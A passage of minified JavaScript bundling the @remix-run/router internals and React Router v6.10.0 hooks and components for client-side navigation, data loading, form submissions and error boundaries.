g,I,N=Ha(e.history,o,m.signal,a&&a.submission);if(a&&a.pendingError)I={[Po(f).route.id]:a.pendingError};else if(a&&a.submission&&br(a.submission.formMethod)){let e=await async function(e,t,i,s,o){U(),L({navigation:_e({state:"submitting",location:t},i)});let a,l=Nm(s,t);if(l.route.action||l.route.lazy){if(a=await Ga("action",e,l,s,r,n,p.basename),e.signal.aborted)return{shortCircuited:!0}}else a={type:It.error,error:cr(405,{method:e.method,pathname:t.pathname,routeId:l.route.id})};if(jo(a)){let e;return e=o&&null!=o.replace?o.replace:a.location===y.location.pathname+y.location.search,await F(y,a,{submission:i,replace:e}),{shortCircuited:!0}}if(Tl(a)){let e=Po(s,l.route.id);return!0!==(o&&o.replace)&&(v=St.Push),{pendingActionData:{},pendingActionError:{[e.route.id]:a.error}}}if(Ts(a))throw cr(400,{type:"defer-action"});return{pendingActionData:{[l.route.id]:a.data}}}(N,o,a.submission,f,{replace:a.replace});if(e.shortCircuited)return;g=e.pendingActionData,I=e.pendingActionError,d=_e({state:"loading",location:o},a.submission),N=new Request(N.url,{signal:N.signal})}let{shortCircuited:A,loaderData:R,errors:P}=await async function(n,r,s,o,a,l,u,c,h){let d=o;d||(d=_e({state:"loading",location:r,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0},a));let f=a||l?a||l:d.formMethod&&d.formAction&&d.formData&&d.formEncType?{formMethod:d.formMethod,formAction:d.formAction,formData:d.formData,formEncType:d.formEncType}:void 0,p=t||i,[g,v]=Z1(e.history,y,s,f,r,_,S,E,D,p,e.basename,c,h);if(Y((e=>!(s&&s.some((t=>t.route.id===e)))||g&&g.some((t=>t.route.id===e)))),0===g.length&&0===v.length)return O(r,_e({matches:s,loaderData:{},errors:h||null},c?{actionData:c}:{})),{shortCircuited:!0};if(!b){v.forEach((e=>{let t=y.fetchers.get(e.key),n={state:"loading",data:t&&t.data,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0," _hasFetcherDoneAnything ":!0};y.fetchers.set(e.key,n)}));let e=c||y.actionData;L(_e({navigation:d},e?0===Object.keys(e).length?{actionData:null}:{actionData:e}:{},v.length>0?{fetchers:new Map(y.fetchers)}:{}))}x=++k,v.forEach((e=>T.set(e.key,m)));let{results:w,loaderResults:I,fetcherResults:N}=await V(y.matches,s,g,v,n);if(n.signal.aborted)return{shortCircuited:!0};v.forEach((e=>T.delete(e.key)));let A=sw(w);if(A)return await F(y,A,{replace:u}),{shortCircuited:!0};let{loaderData:R,errors:P}=nw(y,s,g,I,h,v,N,M);M.forEach(((e,t)=>{e.subscribe((n=>{(n||e.done)&&M.delete(t)}))})),function(){let e=[];for(let t of C){let n=y.fetchers.get(t);de(n,"Expected fetcher: "+t),"loading"===n.state&&(C.delete(t),e.push(t))}j(e)}();let U=q(x);return _e({loaderData:R,errors:P},U||v.length>0?{fetchers:new Map(y.fetchers)}:{})}(N,o,f,d,a&&a.submission,a&&a.fetcherSubmission,a&&a.replace,g,I);A||(m=null,O(o,_e({matches:f},g?{actionData:g}:{},{loaderData:R,errors:P})))}function P(e){return y.fetchers.get(e)||JA}async function F(t,n,r){var i;let{submission:s,replace:o,isFetchActionRedirect:a}=void 0===r?{}:r;n.revalidate&&(_=!0);let l=Ql(t.location,n.location,_e({_isRedirect:!0},a?{_isFetchActionRedirect:!0}:{}));if(de(l,"Expected a location on the redirect navigation"),g2.test(n.location)&&y2&&typeof(null==(i=window)?void 0:i.location)<"u"){let t=e.history.createURL(n.location),r=null==Eu(t.pathname,e.basename||"/");if(window.location.origin!==t.origin||r)return void(o?window.location.replace(n.location):window.location.assign(n.location))}m=null;let u=!0===o?St.Replace:St.Push,{formMethod:c,formAction:h,formEncType:d,formData:f}=t.navigation;!s&&c&&h&&f&&d&&(s={formMethod:c,formAction:h,formEncType:d,formData:f}),XA.has(n.status)&&s&&br(s.formMethod)?await R(u,l,{submission:_e({},s,{formAction:n.location}),preventScrollReset:w}):a?await R(u,l,{overrideNavigation:{state:"loading",location:l,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0},fetcherSubmission:s,preventScrollReset:w}):await R(u,l,{overrideNavigation:{state:"loading",location:l,formMethod:s?s.formMethod:void 0,formAction:s?s.formAction:void 0,formEncType:s?s.formEncType:void 0,formData:s?s.formData:void 0},preventScrollReset:w})}async function V(t,i,s,o,a){let l=await Promise.all([...s.map((e=>Ga("loader",a,e,i,r,n,p.basename))),...o.map((t=>t.matches&&t.match?Ga("loader",Ha(e.history,t.path,a.signal),t.match,t.matches,r,n,p.basename):{type:It.error,error:cr(404,{pathname:t.path})}))]),u=l.slice(0,s.length),c=l.slice(s.length);return await Promise.all([ow(t,s,u,a.signal,!1,y.loaderData),ow(t,o.map((e=>e.match)),c,a.signal,!0)]),{results:l,loaderResults:u,fetcherResults:c}}function U(){_=!0,S.push(...Y()),D.forEach(((e,t)=>{T.has(t)&&(E.push(t),$(t))}))}function B(e,t,n){let r=Po(y.matches,t);z(e),L({errors:{[r.route.id]:n},fetchers:new Map(y.fetchers)})}function z(e){T.has(e)&&$(e),D.delete(e),I.delete(e),C.delete(e),y.fetchers.delete(e)}function $(e){let t=T.get(e);de(t,"Expected fetch controller: "+e),t.abort(),T.delete(e)}function j(e){for(let t of e){let e={state:"idle",data:P(t).data,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0," _hasFetcherDoneAnything ":!0};y.fetchers.set(t,e)}}function q(e){let t=[];for(let[n,r]of I)if(r<e){let e=y.fetchers.get(n);de(e,"Expected fetcher: "+n),"loading"===e.state&&($(n),I.delete(n),t.push(n))}return j(t),t.length>0}function G(e){y.blockers.delete(e),N.delete(e)}function W(e,t){let n=y.blockers.get(e)||X1;de("unblocked"===n.state&&"blocked"===t.state||"blocked"===n.state&&"blocked"===t.state||"blocked"===n.state&&"proceeding"===t.state||"blocked"===n.state&&"unblocked"===t.state||"proceeding"===n.state&&"unblocked"===t.state,"Invalid blocker state transition: "+n.state+" -> "+t.state),y.blockers.set(e,t),L({blockers:new Map(y.blockers)})}function K(e){let{currentLocation:t,nextLocation:n,historyAction:r}=e;if(0===N.size)return;N.size>1&&ta(!1,"A router only supports one blocker at a time");let i=Array.from(N.entries()),[s,o]=i[i.length-1],a=y.blockers.get(s);return a&&"proceeding"===a.state||!o({currentLocation:t,nextLocation:n,historyAction:r})?void 0:s}function Y(e){let t=[];return M.forEach(((n,r)=>{(!e||e(r))&&(n.cancel(),t.push(r),M.delete(r))})),t}function H(e,t){if(l&&u&&c){let n=t.map((e=>aw(e,y.loaderData))),r=u(e,n)||e.key,i=l[r];if("number"==typeof i)return i}return null}return p={get basename(){return e.basename},get state(){return y},get routes(){return i},initialize:function(){return o=e.history.listen((t=>{let{action:n,location:r,delta:i}=t;if(A)return void(A=!1);ta(0===N.size||null!=i,"You are trying to use a blocker on a POP navigation to a location that was not created by @remix-run/router. This will fail silently in production. This can happen if you are navigating outside the router via `window.history.pushState`/`window.location.hash` instead of using router navigation APIs.  This can also happen if you are using createHashRouter and the user manually changes the URL.");let s=K({currentLocation:y.location,nextLocation:r,historyAction:n});return s&&null!=i?(A=!0,e.history.go(-1*i),void W(s,{state:"blocked",location:r,proceed(){W(s,{state:"proceeding",proceed:void 0,reset:void 0,location:r}),e.history.go(i)},reset(){G(s),L({blockers:new Map(p.state.blockers)})}})):R(n,r)})),y.initialized||R(St.Pop,y.location),p},subscribe:function(e){return a.add(e),()=>a.delete(e)},enableScrollRestoration:function(e,t,n){if(l=e,c=t,u=n||(e=>e.key),!h&&y.navigation===cp){h=!0;let e=H(y.location,y.matches);null!=e&&L({restoreScrollPosition:e})}return()=>{l=null,c=null,u=null}},navigate:async function t(n,r){if("number"==typeof n)return void e.history.go(n);let{path:i,submission:o,error:a}=J1(n,s,r),l=y.location,u=Ql(y.location,i,r&&r.state);u=_e({},u,e.history.encodeLocation(u));let c=r&&null!=r.replace?r.replace:void 0,h=St.Push;!0===c?h=St.Replace:!1===c||null!=o&&br(o.formMethod)&&o.formAction===y.location.pathname+y.location.search&&(h=St.Replace);let d=r&&"preventScrollReset"in r?!0===r.preventScrollReset:void 0,f=K({currentLocation:l,nextLocation:u,historyAction:h});if(!f)return await R(h,u,{submission:o,pendingError:a,preventScrollReset:d,replace:r&&r.replace});W(f,{state:"blocked",location:u,proceed(){W(f,{state:"proceeding",proceed:void 0,reset:void 0,location:u}),t(n,r)},reset(){G(f),L({blockers:new Map(y.blockers)})}})},fetch:function(o,a,l,u){if(ZA)throw new Error("router.fetch() was called during the server render, but it shouldn't be. You are likely calling a useFetcher() method in the body of your component. Try moving it to a useEffect or a callback.");T.has(o)&&$(o);let c=Oo(t||i,l,e.basename);if(!c)return void B(o,a,cr(404,{pathname:l}));let{path:h,submission:d}=J1(l,s,u,!0),f=Nm(c,h);w=!0===(u&&u.preventScrollReset),d&&br(d.formMethod)?async function(s,o,a,l,u,c){if(U(),D.delete(s),!l.route.action&&!l.route.lazy){let e=cr(405,{method:c.formMethod,pathname:a,routeId:o});return void B(s,o,e)}let h=y.fetchers.get(s),d=_e({state:"submitting"},c,{data:h&&h.data," _hasFetcherDoneAnything ":!0});y.fetchers.set(s,d),L({fetchers:new Map(y.fetchers)});let f=new AbortController,g=Ha(e.history,a,f.signal,c);T.set(s,f);let w=await Ga("action",g,l,u,r,n,p.basename);if(g.signal.aborted)return void(T.get(s)===f&&T.delete(s));if(jo(w)){T.delete(s),C.add(s);let e=_e({state:"loading"},c,{data:void 0," _hasFetcherDoneAnything ":!0});return y.fetchers.set(s,e),L({fetchers:new Map(y.fetchers)}),F(y,w,{submission:c,isFetchActionRedirect:!0})}if(Tl(w))return void B(s,o,w.error);if(Ts(w))throw cr(400,{type:"defer-action"});let b=y.navigation.location||y.location,N=Ha(e.history,b,f.signal),A=t||i,R="idle"!==y.navigation.state?Oo(A,y.navigation.location,e.basename):y.matches;de(R,"Didn't find any matches after fetcher action");let P=++k;I.set(s,P);let z=_e({state:"loading",data:w.data},c,{" _hasFetcherDoneAnything ":!0});y.fetchers.set(s,z);let[$,j]=Z1(e.history,y,R,c,b,_,S,E,D,A,e.basename,{[l.route.id]:w.data},void 0);j.filter((e=>e.key!==s)).forEach((e=>{let t=e.key,n=y.fetchers.get(t),r={state:"loading",data:n&&n.data,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0," _hasFetcherDoneAnything ":!0};y.fetchers.set(t,r),T.set(t,f)})),L({fetchers:new Map(y.fetchers)});let{results:G,loaderResults:W,fetcherResults:K}=await V(y.matches,R,$,j,N);if(f.signal.aborted)return;I.delete(s),T.delete(s),j.forEach((e=>T.delete(e.key)));let Y=sw(G);if(Y)return F(y,Y);let{loaderData:H,errors:Q}=nw(y,y.matches,$,W,void 0,j,K,M),X={state:"idle",data:w.data,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0," _hasFetcherDoneAnything ":!0};y.fetchers.set(s,X);let J=q(P);"loading"===y.navigation.state&&P>x?(de(v,"Expected pending action"),m&&m.abort(),O(y.navigation.location,{matches:R,loaderData:H,errors:Q,fetchers:new Map(y.fetchers)})):(L(_e({errors:Q,loaderData:rw(y.loaderData,H,R,Q)},J?{fetchers:new Map(y.fetchers)}:{})),_=!1)}(o,a,h,f,c,d):(D.set(o,{routeId:a,path:h}),async function(t,i,s,o,a,l){let u=y.fetchers.get(t),c=_e({state:"loading",formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0},l,{data:u&&u.data," _hasFetcherDoneAnything ":!0});y.fetchers.set(t,c),L({fetchers:new Map(y.fetchers)});let h=new AbortController,d=Ha(e.history,s,h.signal);T.set(t,h);let f=await Ga("loader",d,o,a,r,n,p.basename);if(Ts(f)&&(f=await _2(f,d.signal,!0)||f),T.get(t)===h&&T.delete(t),d.signal.aborted)return;if(jo(f))return void await F(y,f);if(Tl(f)){let e=Po(y.matches,i);return y.fetchers.delete(t),void L({fetchers:new Map(y.fetchers),errors:{[e.route.id]:f.error}})}de(!Ts(f),"Unhandled fetcher deferred data");let m={state:"idle",data:f.data,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0," _hasFetcherDoneAnything ":!0};y.fetchers.set(t,m),L({fetchers:new Map(y.fetchers)})}(o,a,h,f,c,d))},revalidate:function(){if(U(),L({revalidation:"loading"}),"submitting"!==y.navigation.state){if("idle"===y.navigation.state)return void R(y.historyAction,y.location,{startUninterruptedRevalidation:!0});R(v||y.historyAction,y.navigation.location,{overrideNavigation:y.navigation})}},createHref:t=>e.history.createHref(t),encodeLocation:t=>e.history.encodeLocation(t),getFetcher:P,deleteFetcher:z,dispose:function(){o&&o(),a.clear(),m&&m.abort(),y.fetchers.forEach(((e,t)=>z(t))),y.blockers.forEach(((e,t)=>G(t)))},getBlocker:function(e,t){let n=y.blockers.get(e)||X1;return N.get(e)!==t&&N.set(e,t),n},deleteBlocker:G,_internalFetchControllers:T,_internalActiveDeferreds:M,_internalSetRoutes:function(e){t=e}},p}function nb(e){return null!=e&&"formData"in e}function J1(e,t,n,r){void 0===r&&(r=!1);let i,s="string"==typeof e?e:Gr(e);if(!n||!nb(n))return{path:s};if(n.formMethod&&!ub(n.formMethod))return{path:s,error:cr(405,{method:n.formMethod})};if(n.formData){let e=n.formMethod||"get";if(i={formMethod:t.v7_normalizeFormMethod?e.toUpperCase():e.toLowerCase(),formAction:S2(s),formEncType:n&&n.formEncType||"application/x-www-form-urlencoded",formData:n.formData},br(i.formMethod))return{path:s,submission:i}}let o=Xr(s),a=w2(n.formData);return r&&o.search&&E2(o.search)&&a.append("index",""),o.search="?"+a,{path:Gr(o),submission:i}}function rb(e,t){let n=e;if(t){let r=e.findIndex((e=>e.route.id===t));r>=0&&(n=e.slice(0,r))}return n}function Z1(e,t,n,r,i,s,o,a,l,u,c,h,d){let f=d?Object.values(d)[0]:h?Object.values(h)[0]:void 0,p=e.createURL(t.location),m=e.createURL(i),g=s||p.toString()===m.toString()||p.search!==m.search,y=d?Object.keys(d)[0]:void 0,v=rb(n,y).filter(((e,n)=>{if(e.route.lazy)return!0;if(null==e.route.loader)return!1;if(ib(t.loaderData,t.matches[n],e)||o.some((t=>t===e.route.id)))return!0;let i=t.matches[n],s=e;return ew(e,_e({currentUrl:p,currentParams:i.params,nextUrl:m,nextParams:s.params},r,{actionResult:f,defaultShouldRevalidate:g||v2(i,s)}))})),w=[];return l.forEach(((e,i)=>{if(!n.some((t=>t.route.id===e.routeId)))return;let s=Oo(u,e.path,c);if(!s)return void w.push(_e({key:i},e,{matches:null,match:null}));let o=Nm(s,e.path);(a.includes(i)||ew(o,_e({currentUrl:p,currentParams:t.matches[t.matches.length-1].params,nextUrl:m,nextParams:n[n.length-1].params},r,{actionResult:f,defaultShouldRevalidate:g})))&&w.push(_e({key:i,matches:s,match:o},e))})),[v,w]}function ib(e,t,n){let r=!t||n.route.id!==t.route.id,i=void 0===e[n.route.id];return r||i}function v2(e,t){let n=e.route.path;return e.pathname!==t.pathname||null!=n&&n.endsWith("*")&&e.params["*"]!==t.params["*"]}function ew(e,t){if(e.route.shouldRevalidate){let n=e.route.shouldRevalidate(t);if("boolean"==typeof n)return n}return t.defaultShouldRevalidate}async function tw(e,t,n){if(!e.lazy)return;let r=await e.lazy();if(!e.lazy)return;let i=n[e.id];de(i,"No route found in manifest");let s={};for(let e in r){let t=void 0!==i[e]&&"hasErrorBoundary"!==e;ta(!t,'Route "'+i.id+'" has a static property "'+e+'" defined but its lazy function is also returning a value for this property. The lazy route property "'+e+'" will be ignored.'),!t&&!kA.has(e)&&(s[e]=r[e])}Object.assign(i,s),Object.assign(i,{hasErrorBoundary:t(_e({},i)),lazy:void 0})}async function Ga(e,t,n,r,i,s,o,a,l,u){void 0===o&&(o="/"),void 0===a&&(a=!1),void 0===l&&(l=!1);let c,h,d,f=e=>{let r,i=new Promise(((e,t)=>r=t));return d=()=>r(),t.signal.addEventListener("abort",d),Promise.race([e({request:t,params:n.params,context:u}),i])};try{let r=n.route[e];if(n.route.lazy)if(r)h=(await Promise.all([f(r),tw(n.route,s,i)]))[0];else{if(await tw(n.route,s,i),r=n.route[e],!r){if("action"===e)throw cr(405,{method:t.method,pathname:new URL(t.url).pathname,routeId:n.route.id});return{type:It.data,data:void 0}}h=await f(r)}else de(r,"Could not find the "+e+' to run on the "'+n.route.id+'" route'),h=await f(r);de(void 0!==h,"You defined "+("action"===e?"an action":"a loader")+' for route "'+n.route.id+"\" but didn't return anything from your `"+e+"` function. Please return a value or `null`.")}catch(e){c=It.error,h=e}finally{d&&t.signal.removeEventListener("abort",d)}if(lb(h)){let e=h.status;if(QA.has(e)){let i=h.headers.get("Location");if(de(i,"Redirects returned/thrown from loaders/actions must have a Location header"),g2.test(i)){if(!a){let e=new URL(t.url),n=i.startsWith("//")?new URL(e.protocol+i):new URL(i),r=null!=Eu(n.pathname,o);n.origin===e.origin&&r&&(i=n.pathname+n.search+n.hash)}}else{let e=wy(i,Id(r.slice(0,r.indexOf(n)+1)).map((e=>e.pathnameBase)),new URL(t.url).pathname);if(de(Gr(e),"Unable to resolve redirect location: "+i),o){let t=e.pathname;e.pathname="/"===t?o:zr([o,t])}i=Gr(e)}if(a)throw h.headers.set("Location",i),h;return{type:It.redirect,status:e,location:i,revalidate:null!==h.headers.get("X-Remix-Revalidate")}}if(l)throw{type:c||It.data,response:h};let i,s=h.headers.get("Content-Type");return i=s&&/\bapplication\/json\b/.test(s)?await h.json():await h.text(),c===It.error?{type:c,error:new Sy(e,h.statusText,i),headers:h.headers}:{type:It.data,data:i,statusCode:h.status,headers:h.headers}}return c===It.error?{type:c,error:h}:ab(h)?{type:It.deferred,deferredData:h,statusCode:null==(p=h.init)?void 0:p.status,headers:(null==(m=h.init)?void 0:m.headers)&&new Headers(h.init.headers)}:{type:It.data,data:h};var p,m}function Ha(e,t,n,r){let i=e.createURL(S2(t)).toString(),s={signal:n};if(r&&br(r.formMethod)){let{formMethod:e,formEncType:t,formData:n}=r;s.method=e.toUpperCase(),s.body="application/x-www-form-urlencoded"===t?w2(n):n}return new Request(i,s)}function w2(e){let t=new URLSearchParams;for(let[n,r]of e.entries())t.append(n,r instanceof File?r.name:r);return t}function sb(e,t,n,r,i){let s,o={},a=null,l=!1,u={};return n.forEach(((n,c)=>{let h=t[c].route.id;if(de(!jo(n),"Cannot handle redirect results in processLoaderData"),Tl(n)){let t=Po(e,h),i=n.error;r&&(i=Object.values(r)[0],r=void 0),a=a||{},null==a[t.route.id]&&(a[t.route.id]=i),o[h]=void 0,l||(l=!0,s=p2(n.error)?n.error.status:500),n.headers&&(u[h]=n.headers)}else Ts(n)?(i.set(h,n.deferredData),o[h]=n.deferredData.data):o[h]=n.data,null!=n.statusCode&&200!==n.statusCode&&!l&&(s=n.statusCode),n.headers&&(u[h]=n.headers)})),r&&(a=r,o[Object.keys(r)[0]]=void 0),{loaderData:o,errors:a,statusCode:s||200,loaderHeaders:u}}function nw(e,t,n,r,i,s,o,a){let{loaderData:l,errors:u}=sb(t,n,r,i,a);for(let t=0;t<s.length;t++){let{key:n,match:r}=s[t];de(void 0!==o&&void 0!==o[t],"Did not find corresponding fetcher result");let i=o[t];if(Tl(i)){let t=Po(e.matches,null==r?void 0:r.route.id);u&&u[t.route.id]||(u=_e({},u,{[t.route.id]:i.error})),e.fetchers.delete(n)}else if(jo(i))de(!1,"Unhandled fetcher revalidation redirect");else if(Ts(i))de(!1,"Unhandled fetcher deferred data");else{let t={state:"idle",data:i.data,formMethod:void 0,formAction:void 0,formEncType:void 0,formData:void 0," _hasFetcherDoneAnything ":!0};e.fetchers.set(n,t)}}return{loaderData:l,errors:u}}function rw(e,t,n,r){let i=_e({},t);for(let s of n){let n=s.route.id;if(t.hasOwnProperty(n)?void 0!==t[n]&&(i[n]=t[n]):void 0!==e[n]&&s.route.loader&&(i[n]=e[n]),r&&r.hasOwnProperty(n))break}return i}function Po(e,t){return(t?e.slice(0,e.findIndex((e=>e.route.id===t))+1):[...e]).reverse().find((e=>!0===e.route.hasErrorBoundary))||e[0]}function iw(e){let t=e.find((e=>e.index||!e.path||"/"===e.path))||{id:"__shim-error-route__"};return{matches:[{params:{},pathname:"",pathnameBase:"",route:t}],route:t}}function cr(e,t){let{pathname:n,routeId:r,method:i,type:s}=void 0===t?{}:t,o="Unknown Server Error",a="Unknown @remix-run/router error";return 400===e?(o="Bad Request",i&&n&&r?a="You made a "+i+' request to "'+n+'" but did not provide a `loader` for route "'+r+'", so there is no way to handle the request.':"defer-action"===s&&(a="defer() is not supported in actions")):403===e?(o="Forbidden",a='Route "'+r+'" does not match URL "'+n+'"'):404===e?(o="Not Found",a='No route matches URL "'+n+'"'):405===e&&(o="Method Not Allowed",i&&n&&r?a="You made a "+i.toUpperCase()+' request to "'+n+'" but did not provide an `action` for route "'+r+'", so there is no way to handle the request.':i&&(a='Invalid request method "'+i.toUpperCase()+'"')),new Sy(e||500,o,new Error(a),!0)}function sw(e){for(let t=e.length-1;t>=0;t--){let n=e[t];if(jo(n))return n}}function S2(e){return Gr(_e({},"string"==typeof e?Xr(e):e,{hash:""}))}function ob(e,t){return e.pathname===t.pathname&&e.search===t.search&&e.hash!==t.hash}function Ts(e){return e.type===It.deferred}function Tl(e){return e.type===It.error}function jo(e){return(e&&e.type)===It.redirect}function ab(e){let t=e;return t&&"object"==typeof t&&"object"==typeof t.data&&"function"==typeof t.subscribe&&"function"==typeof t.cancel&&"function"==typeof t.resolveData}function lb(e){return null!=e&&"number"==typeof e.status&&"string"==typeof e.statusText&&"object"==typeof e.headers&&typeof e.body<"u"}function ub(e){return KA.has(e.toLowerCase())}function br(e){return GA.has(e.toLowerCase())}async function ow(e,t,n,r,i,s){for(let o=0;o<n.length;o++){let a=n[o],l=t[o];if(!l)continue;let u=e.find((e=>e.route.id===l.route.id)),c=null!=u&&!v2(u,l)&&void 0!==(s&&s[l.route.id]);Ts(a)&&(i||c)&&await _2(a,r,i).then((e=>{e&&(n[o]=e||n[o])}))}}async function _2(e,t,n){if(void 0===n&&(n=!1),!await e.deferredData.resolveData(t)){if(n)try{return{type:It.data,data:e.deferredData.unwrappedData}}catch(e){return{type:It.error,error:e}}return{type:It.data,data:e.deferredData.data}}}function E2(e){return new URLSearchParams(e).getAll("index").some((e=>""===e))}function aw(e,t){let{route:n,pathname:r,params:i}=e;return{id:n.id,pathname:r,params:i,data:t[n.id],handle:n.handle}}function Nm(e,t){let n="string"==typeof t?Xr(t).search:t.search;if(e[e.length-1].route.index&&E2(n||""))return e[e.length-1];let r=Id(e);return r[r.length-1]}
/**
 * React Router v6.10.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function cb(e,t){return e===t&&(0!==e||1/e==1/t)||e!=e&&t!=t}const hb="function"==typeof Object.is?Object.is:cb,{useState:db,useEffect:fb,useLayoutEffect:pb,useDebugValue:mb}=Pp;function gb(e,t,n){const r=t(),[{inst:i},s]=db({inst:{value:r,getSnapshot:t}});return pb((()=>{i.value=r,i.getSnapshot=t,hp(i)&&s({inst:i})}),[e,r,t]),fb((()=>(hp(i)&&s({inst:i}),e((()=>{hp(i)&&s({inst:i})})))),[e]),mb(r),r}function hp(e){const t=e.getSnapshot,n=e.value;try{const e=t();return!hb(n,e)}catch{return!0}}function yb(e,t,n){return t()}const vb=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",wb=!vb,Sb=wb?yb:gb,_b="useSyncExternalStore"in Pp?Pp.useSyncExternalStore:Sb,_y=$.createContext(null),Ey=$.createContext(null),Tu=$.createContext(null),kd=$.createContext(null),Xs=$.createContext({outlet:null,matches:[]}),T2=$.createContext(null);function Mm(){return(Mm=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(e[r]=n[r])}return e}).apply(this,arguments)}function Eb(e,t){let{relative:n}=void 0===t?{}:t;xu()||de(!1);let{basename:r,navigator:i}=$.useContext(Tu),{hash:s,pathname:o,search:a}=I2(e,{relative:n}),l=o;return"/"!==r&&(l="/"===o?r:zr([r,o])),i.createHref({pathname:l,search:a,hash:s})}function xu(){return null!=$.useContext(kd)}function Dd(){return xu()||de(!1),$.useContext(kd).location}function Tb(){xu()||de(!1);let{basename:e,navigator:t}=$.useContext(Tu),{matches:n}=$.useContext(Xs),{pathname:r}=Dd(),i=JSON.stringify(Id(n).map((e=>e.pathnameBase))),s=$.useRef(!1);return $.useEffect((()=>{s.current=!0})),$.useCallback((function(n,o){if(void 0===o&&(o={}),!s.current)return;if("number"==typeof n)return void t.go(n);let a=wy(n,JSON.parse(i),r,"path"===o.relative);"/"!==e&&(a.pathname="/"===a.pathname?e:zr([e,a.pathname])),(o.replace?t.replace:t.push)(a,o.state,o)}),[e,t,i,r])}function x2(){let{matches:e}=$.useContext(Xs),t=e[e.length-1];return t?t.params:{}}function I2(e,t){let{relative:n}=void 0===t?{}:t,{matches:r}=$.useContext(Xs),{pathname:i}=Dd(),s=JSON.stringify(Id(r).map((e=>e.pathnameBase)));return $.useMemo((()=>wy(e,JSON.parse(s),i,"path"===n)),[e,s,i,n])}function xb(e,t){xu()||de(!1);let{navigator:n}=$.useContext(Tu),r=$.useContext(Ey),{matches:i}=$.useContext(Xs),s=i[i.length-1],o=s?s.params:{};s&&s.pathname;let a=s?s.pathnameBase:"/";s&&s.route;let l,u=Dd();if(t){var c;let e="string"==typeof t?Xr(t):t;"/"===a||null!=(c=e.pathname)&&c.startsWith(a)||de(!1),l=e}else l=u;let h=l.pathname||"/",d=Oo(e,{pathname:"/"===a?h:h.slice(a.length)||"/"}),f=Cb(d&&d.map((e=>Object.assign({},e,{params:Object.assign({},o,e.params),pathname:zr([a,n.encodeLocation?n.encodeLocation(e.pathname).pathname:e.pathname]),pathnameBase:"/"===e.pathnameBase?a:zr([a,n.encodeLocation?n.encodeLocation(e.pathnameBase).pathname:e.pathnameBase])}))),i,r||void 0);return t&&f?$.createElement(kd.Provider,{value:{location:Mm({pathname:"/",search:"",hash:"",state:null,key:"default"},l),navigationType:St.Pop}},f):f}function Ib(){let e=Ab(),t=p2(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),n=e instanceof Error?e.stack:null;return $.createElement($.Fragment,null,$.createElement("h2",null,"Unexpected Application Error!"),$.createElement("h3",{style:{fontStyle:"italic"}},t),n?$.createElement("pre",{style:{padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"}},n):null,null)}class kb extends $.Component{constructor(e){super(e),this.state={location:e.location,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,t){return t.location!==e.location?{error:e.error,location:e.location}:{error:e.error||t.error,location:t.location}}componentDidCatch(e,t){console.error("React Router caught the following error during render",e,t)}render(){return this.state.error?$.createElement(Xs.Provider,{value:this.props.routeContext},$.createElement(T2.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function Db(e){let{routeContext:t,match:n,children:r}=e,i=$.useContext(_y);return i&&i.static&&i.staticContext&&(n.route.errorElement||n.route.ErrorBoundary)&&(i.staticContext._deepestRenderedBoundaryId=n.route.id),$.createElement(Xs.Provider,{value:t},r)}function Cb(e,t,n){if(void 0===t&&(t=[]),null==e){if(null==n||!n.errors)return null;e=n.matches}let r=e,i=null==n?void 0:n.errors;if(null!=i){let e=r.findIndex((e=>e.route.id&&(null==i?void 0:i[e.route.id])));e>=0||de(!1),r=r.slice(0,Math.min(r.length,e+1))}return r.reduceRight(((e,s,o)=>{let a=s.route.id?null==i?void 0:i[s.route.id]:null,l=null;n&&(l=s.route.ErrorBoundary?$.createElement(s.route.ErrorBoundary,null):s.route.errorElement?s.route.errorElement:$.createElement(Ib,null));let u=t.concat(r.slice(0,o+1)),c=()=>{let t=e;return a?t=l:s.route.Component?t=$.createElement(s.route.Component,null):s.route.element&&(t=s.route.element),$.createElement(Db,{match:s,routeContext:{outlet:e,matches:u},children:t})};return n&&(s.route.ErrorBoundary||s.route.errorElement||0===o)?$.createElement(kb,{location:n.location,component:l,error:a,children:c(),routeContext:{outlet:null,matches:u}}):c()}),null)}var lw,bh,uw;function Nb(e){let t=$.useContext(Ey);return t||de(!1),t}function Mb(e){let t=$.useContext(Xs);return t||de(!1),t}function Rb(e){let t=Mb(),n=t.matches[t.matches.length-1];return n.route.id||de(!1),n.route.id}function Ab(){var e;let t=$.useContext(T2),n=Nb(bh.UseRouteError),r=Rb(bh.UseRouteError);return t||(null==(e=n.errors)?void 0:e[r])}function bb(e){let{fallbackElement:t,router:n}=e,r=$.useCallback((()=>n.state),[n]),i=_b(n.subscribe,r,r),s=$.useMemo((()=>({createHref:n.createHref,encodeLocation:n.encodeLocation,go:e=>n.navigate(e),push:(e,t,r)=>n.navigate(e,{state:t,preventScrollReset:null==r?void 0:r.preventScrollReset}),replace:(e,t,r)=>n.navigate(e,{replace:!0,state:t,preventScrollReset:null==r?void 0:r.preventScrollReset})})),[n]),o=n.basename||"/",a=$.useMemo((()=>({router:n,navigator:s,static:!1,basename:o})),[n,s,o]);return $.createElement($.Fragment,null,$.createElement(_y.Provider,{value:a},$.createElement(Ey.Provider,{value:i},$.createElement(Pb,{basename:n.basename,location:n.state.location,navigationType:n.state.historyAction,navigator:s},n.state.initialized?$.createElement($b,null):t))),null)}function Ob(e){de(!1)}function Pb(e){let{basename:t="/",children:n=null,location:r,navigationType:i=St.Pop,navigator:s,static:o=!1}=e;xu()&&de(!1);let a=t.replace(/^\/*/,"/"),l=$.useMemo((()=>({basename:a,navigator:s,static:o})),[a,s,o]);"string"==typeof 